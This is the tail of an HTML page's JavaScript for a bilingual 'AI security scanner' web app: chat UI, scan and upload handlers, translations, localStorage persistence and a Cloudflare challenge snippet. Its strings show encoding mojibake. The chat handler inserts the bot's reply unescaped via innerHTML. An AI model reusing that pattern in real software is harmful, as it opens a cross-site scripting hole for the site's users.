        const loadingEl = document.createElement('div');
        loadingEl.innerHTML = `
          <div style="background: rgba(168, 85, 247, 0.1); padding: 12px; border-radius: 8px; border-left: 3px solid #a855f7;">
            <div style="font-size: 12px; color: #a855f7; margin-bottom: 4px; font-weight: 600;">ü§ñ DGVIKAKA Bot</div>
            <div style="color: #ffffff; font-size: 14px;">ƒêang x·ª≠ l√Ω...</div>
          </div>
        `;
        chatContainer.appendChild(loadingEl);
        chatContainer.scrollTop = chatContainer.scrollHeight;
        
        try {
          const aiResponse = await TelegramBot.chatWithSmartAI(userMessage);
          
          chatContainer.removeChild(loadingEl);
          
          const cleanResponse = aiResponse.replace(/DGVIKAKA Bot\n\n/g, '');
          
          const aiMsgEl = document.createElement('div');
          aiMsgEl.style.cssText = 'background: rgba(168, 85, 247, 0.1); padding: 12px; border-radius: 8px; border-left: 3px solid #a855f7;';
          aiMsgEl.innerHTML = `
            <div style="font-size: 12px; color: #a855f7; margin-bottom: 4px; font-weight: 600;">ü§ñ DGVIKAKA Bot</div>
            <div style="color: #ffffff; font-size: 14px; line-height: 1.5; white-space: pre-line;">${cleanResponse}</div>
          `;
          chatContainer.appendChild(aiMsgEl);
          chatContainer.scrollTop = chatContainer.scrollHeight;
        } catch (error) {
          chatContainer.removeChild(loadingEl);
          console.error('Chat error:', error);
        }
      }
    };

    document.getElementById('toggleAIMonitorBtn').addEventListener('click', () => {
      console.log('üñ±Ô∏è AI toggle button clicked');
      if (AppState.aiMonitor.active) {
        AIMonitor.stop();
      } else {
        AIMonitor.start();
      }
    });

    const uploadZone = document.getElementById('uploadZone');
    const fileInput = document.getElementById('fileInput');

    uploadZone.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', (e) => {
      if (e.target.files.length > 0) Actions.handleFiles(e.target.files);
    });

    uploadZone.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadZone.style.borderColor = '#00d4ff';
    });

    uploadZone.addEventListener('dragleave', () => {
      uploadZone.style.borderColor = 'rgba(0, 212, 255, 0.5)';
    });

    uploadZone.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadZone.style.borderColor = 'rgba(0, 212, 255, 0.5)';
      if (e.dataTransfer.files.length > 0) Actions.handleFiles(e.dataTransfer.files);
    });

    document.getElementById('scanBtn').addEventListener('click', () => {
      console.log('üñ±Ô∏è Scan button clicked');
      Scanner.scanSystem();
    });
    
    document.getElementById('stopBtn').addEventListener('click', () => {
      console.log('üñ±Ô∏è Stop button clicked');
      Scanner.stopScan();
    });
    
    document.getElementById('clearBtn').addEventListener('click', () => {
      console.log('üñ±Ô∏è Clear button clicked');
      Actions.clearQuarantine();
    });

    document.getElementById('sendChatBtn').addEventListener('click', () => {
      const input = document.getElementById('chatInput');
      const message = input.value.trim();
      if (message) {
        AIChat.sendMessage(message);
        input.value = '';
      }
    });

    document.getElementById('chatInput').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        const message = e.target.value.trim();
        if (message) {
          AIChat.sendMessage(message);
          e.target.value = '';
        }
      }
    });

    document.getElementById('requestAllBtn').addEventListener('click', () => {
      console.log('üñ±Ô∏è Request all permissions clicked');
      PermissionManager.requestAll();
    });

    const Language = {
      current: 'vi',
      translations: {
        vi: {
          headerSubtitle: 'H·ªá th·ªëng qu√©t b·∫£o m·∫≠t AI - T·ª± ƒë·ªông ph√°t hi·ªán m√¥i tr∆∞·ªùng',
          aiSystemTitle: 'ü§ñ H·ªá th·ªëng b·∫£o m·∫≠t ƒëa AI',
          aiSystemDesc: '5 AI Agents + T·ª± ƒë·ªông ch·∫∑n - B·∫£o v·ªá th·ªùi gian th·ª±c',
          aiMonitorBadge: 'KH√îNG HO·∫†T ƒê·ªòNG',
          aiMonitorBadgeActive: 'ƒêANG HO·∫†T ƒê·ªòNG',
          deployBtn: 'Tri·ªÉn khai AI',
          shutdownBtn: 'T·∫Øt AI',
          activeAILabel: 'ü§ñ AI HO·∫†T ƒê·ªòNG',
          totalScansLabel: 'T·ªîNG QU√âT',
          threatsBlockedLabel: 'M·ªêI ƒêE D·ªåA CH·∫∂N',
          autoBlocksLabel: 'T·ª∞ ƒê·ªòNG CH·∫∂N',
          ai1Name: 'Gi√°m s√°t b·ªô nh·ªõ',
          ai2Name: 'Gi√°m s√°t m·∫°ng',
          ai3Name: 'Gi√°m s√°t ti·∫øn tr√¨nh',
          ai4Name: 'B·∫£o v·ªá d·ªØ li·ªáu',
          ai5Name: 'SƒÉn l√πng m·ªëi ƒëe d·ªça',
          aiStatusOffline: 'Kh√¥ng ho·∫°t ƒë·ªông',
          aiStatusActive: 'Ho·∫°t ƒë·ªông - ƒêang qu√©t',
          scansLabel: 'Qu√©t:',
          blocksLabel: 'Ch·∫∑n:',
          virusLabel: 'Virus ph√°t hi·ªán',
          scannedLabel: 'File ƒë√£ qu√©t',
          cleanLabel: 'File s·∫°ch',
          quarantineLabel: 'ƒê√£ c√°ch ly',
          uploadTitle: 'TÔøΩÔøΩi l√™n & T·ª± ƒë·ªông qu√©t',
          dragDropText: 'K√©o th·∫£ ho·∫∑c Click ƒë·ªÉ ch·ªçn',
          autoScanText: 'T·ª± ƒë·ªông qu√©t khi t·∫£i l√™n - H·ªó tr·ª£ nhi·ªÅu file',
          deepScanTitle: 'üî• Qu√©t s√¢u h·ªá th·ªëng (15 Module)',
          scanStatus: 'S·∫µn s√†ng qu√©t s√¢u h·ªá th·ªëng',
          deepScanBtn: 'üöÄ Qu√©t s√¢u h·ªá th·ªëng',
          stopBtn: 'üõë D·ª´ng qu√©t',
          clearBtn: 'üóëÔ∏è X√≥a c√°ch ly',
          activeThreatsTitle: 'ü¶† M·ªëi ƒëe d·ªça ƒëang ho·∫°t ƒë·ªông',
          quarantineZoneTitle: 'üîí Khu v·ª±c c√°ch ly',
          noThreatsText: 'Kh√¥ng c√≥ m·ªëi ƒëe d·ªça',
          quarantineEmptyText: 'Khu c√°ch ly tr·ªëng',
          aiAssistantTitle: 'ü§ñ Tr·ª£ l√Ω b·∫£o m·∫≠t AI',
          chatPlaceholder: 'H·ªèi AI v·ªÅ b·∫£o m·∫≠t...',
          sendBtnText: 'üì§ G·ª≠i',
          activityLogTitle: 'üëÅÔ∏è Nh·∫≠t k√Ω ho·∫°t ƒë·ªông th·ªùi gian th·ª±c',
          monitoringText: 'ƒêang gi√°m s√°t...'
        },
        en: {
          headerSubtitle: 'AI Security Scanner - Auto Environment Detection',
          aiSystemTitle: 'Multi-AI Security System',
          aiSystemDesc: '5 AI Agents + Auto Block - Realtime Protection',
          aiMonitorBadge: 'INACTIVE',
          aiMonitorBadgeActive: 'DEPLOYED',
          deployBtn: 'Deploy AI Army',
          shutdownBtn: 'Shutdown AI Army',
          activeAILabel: 'ACTIVE AI',
          totalScansLabel: 'TOTAL SCANS',
          threatsBlockedLabel: 'THREATS BLOCKED',
          autoBlocksLabel: 'AUTO BLOCKS',
          ai1Name: 'Memory Guardian',
          ai2Name: 'Network Sentinel',
          ai3Name: 'Process Watcher',
          ai4Name: 'Data Protector',
          ai5Name: 'Threat Hunter',
          aiStatusOffline: 'Offline',
          aiStatusActive: 'Active - Scanning',
          scansLabel: 'Scans:',
          blocksLabel: 'Blocks:',
          virusLabel: 'Detected Viruses',
          scannedLabel: 'Files Scanned',
          cleanLabel: 'Clean Files',
          quarantineLabel: 'Quarantined',
          uploadTitle: 'Upload & Auto Scan',
          dragDropText: 'Drag & Drop or Click to Select',
          autoScanText: 'Auto-scan on upload - Multiple files supported',
          deepScanTitle: 'FULL System Scanner (15 Modules)',
          scanStatus: 'Ready to deep scan system',
          deepScanBtn: 'Deep Scan System',
          stopBtn: 'Stop Scan',
          clearBtn: 'Clear Quarantine',
          activeThreatsTitle: 'Active Threats',
          quarantineZoneTitle: 'Quarantine Zone',
          noThreatsText: 'No threats detected',
          quarantineEmptyText: 'Quarantine zone empty',
          aiAssistantTitle: 'AI Security Assistant',
          chatPlaceholder: 'Ask AI about security...',
          sendBtnText: 'Send',
          activityLogTitle: 'Real-time Activity Log',
          monitoringText: 'Monitoring activity...'
        }
      },
      
      switch(lang) {
        this.current = lang;
        this.updateUI();
        
        document.querySelectorAll('.lang-btn').forEach(btn => {
          btn.classList.remove('active');
        });
        
        const activeBtn = lang === 'vi' ? document.getElementById('langVi') : document.getElementById('langEn');
        activeBtn.classList.add('active');
        
        document.getElementById('menuDropdown').style.display = 'none';
      },
      
      updateUI() {
        const t = this.translations[this.current];
        
        document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
        
        document.getElementById('aiSystemTitle').textContent = t.aiSystemTitle;
        document.getElementById('aiSystemDesc').textContent = t.aiSystemDesc;
        document.getElementById('activeAILabel').textContent = t.activeAILabel;
        document.getElementById('totalScansLabel').textContent = t.totalScansLabel;
        document.getElementById('threatsBlockedLabel').textContent = t.threatsBlockedLabel;
        document.getElementById('autoBlocksLabel').textContent = t.autoBlocksLabel;
        
        document.getElementById('ai1Name').textContent = t.ai1Name;
        document.getElementById('ai2Name').textContent = t.ai2Name;
        document.getElementById('ai3Name').textContent = t.ai3Name;
        document.getElementById('ai4Name').textContent = t.ai4Name;
        document.getElementById('ai5Name').textContent = t.ai5Name;
        
        for (let i = 1; i <= 5; i++) {
          const statusEl = document.getElementById(`ai${i}Status`);
          const agent = AppState.aiMonitor.agents[i - 1];
          statusEl.textContent = agent.active ? t.aiStatusActive : t.aiStatusOffline;
          
          document.getElementById(`ai${i}ScansLabel`).textContent = t.scansLabel;
          document.getElementById(`ai${i}BlocksLabel`).textContent = t.blocksLabel;
        }
        
        const btn = document.getElementById('toggleAIMonitorBtn');
        btn.textContent = AppState.aiMonitor.active ? t.shutdownBtn : t.deployBtn;
        
        const badge = document.getElementById('aiMonitorBadge');
        badge.textContent = AppState.aiMonitor.active ? t.aiMonitorBadgeActive : t.aiMonitorBadge;
        
        document.getElementById('virusLabel').textContent = t.virusLabel;
        document.getElementById('scannedLabel').textContent = t.scannedLabel;
        document.getElementById('cleanLabel').textContent = t.cleanLabel;
        document.getElementById('quarantineLabel').textContent = t.quarantineLabel;
        
        document.getElementById('uploadTitle').textContent = t.uploadTitle;
        document.getElementById('dragDropText').textContent = t.dragDropText;
        document.getElementById('autoScanText').textContent = t.autoScanText;
        document.getElementById('deepScanTitle').textContent = t.deepScanTitle;
        if (!AppState.scanning.isActive) {
          document.getElementById('scanStatus').textContent = t.scanStatus;
        }
        document.getElementById('scanBtn').textContent = t.deepScanBtn;
        document.getElementById('stopBtn').textContent = t.stopBtn;
        document.getElementById('clearBtn').textContent = t.clearBtn;
        
        document.getElementById('activeThreatsTitle').textContent = t.activeThreatsTitle;
        document.getElementById('quarantineZoneTitle').textContent = t.quarantineZoneTitle;
        document.getElementById('noThreatsText').textContent = t.noThreatsText;
        document.getElementById('quarantineEmptyText').textContent = t.quarantineEmptyText;
        
        document.getElementById('aiAssistantTitle').textContent = t.aiAssistantTitle;
        document.getElementById('chatInput').placeholder = t.chatPlaceholder;
        document.getElementById('sendBtnText').textContent = t.sendBtnText;
        document.getElementById('activityLogTitle').textContent = t.activityLogTitle;
        document.getElementById('monitoringText').textContent = t.monitoringText;
      }
    };

    const PersistentWorker = {
      isActive: false,
      workerInterval: null,
      dataStore: null,
      
      async init() {
        this.dataStore = window.localStorage;
        
        const savedState = this.loadState();
        if (savedState) {
          AppState.stats = savedState.stats || AppState.stats;
          AppState.aiMonitor.scanCount = savedState.aiMonitorScanCount || 0;
          AppState.aiMonitor.detections = savedState.aiMonitorDetections || 0;
          AppState.aiMonitor.autoBlocks = savedState.aiMonitorAutoBlocks || 0;
        }
        
        if ('serviceWorker' in navigator) {
          try {
            const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
            console.log('‚úÖ Service Worker registered');
          } catch (error) {
            console.log('‚ö†Ô∏è Service Worker not available');
          }
        }
        
        if ('wakeLock' in navigator) {
          try {
            const wakeLock = await navigator.wakeLock.request('screen');
            console.log('‚úÖ Wake Lock activated');
          } catch (error) {
            console.log('‚ö†Ô∏è Wake Lock not available');
          }
        }
        
        setInterval(() => this.saveState(), 5000);
        
        this.startKeepAlive();
      },
      
      saveState() {
        const state = {
          stats: AppState.stats,
          aiMonitorScanCount: AppState.aiMonitor.scanCount,
          aiMonitorDetections: AppState.aiMonitor.detections,
          aiMonitorAutoBlocks: AppState.aiMonitor.autoBlocks,
          threats: AppState.threats,
          quarantine: AppState.quarantine,
          timestamp: Date.now()
        };
        
        try {
          this.dataStore.setItem('dgvikakazzz_state', JSON.stringify(state));
        } catch (error) {
          console.error('Failed to save state:', error);
        }
      },
      
      loadState() {
        try {
          const saved = this.dataStore.getItem('dgvikakazzz_state');
          if (saved) {
            return JSON.parse(saved);
          }
        } catch (error) {
          console.error('Failed to load state:', error);
        }
        return null;
      },
      
      startKeepAlive() {
        this.workerInterval = setInterval(() => {
          console.log('üíö Keep-alive ping');
          this.saveState();
        }, 30000);
      }
    };

    console.log('üöÄ Initializing app...');
    
    EnvironmentDetector.detect();
    PermissionManager.renderPermissions();
    TelegramBot.init();
    PersistentWorker.init();
    
    console.log('‚úÖ App initialized successfully');
    
    document.getElementById('menuToggle').addEventListener('click', () => {
      const menu = document.getElementById('menuDropdown');
      menu.style.display = menu.style.display === 'none' || menu.style.display === '' ? 'block' : 'none';
    });
    
    document.addEventListener('click', (e) => {
      const menu = document.getElementById('menuDropdown');
      const toggle = document.getElementById('menuToggle');
      if (!menu.contains(e.target) && e.target !== toggle) {
        menu.style.display = 'none';
      }
    });
    
    document.getElementById('langVi').addEventListener('click', () => Language.switch('vi'));
    document.getElementById('langEn').addEventListener('click', () => Language.switch('en'));
  </script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9ab44ee132933f31',t:'MTc2NTI4MTI3MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>

</html>
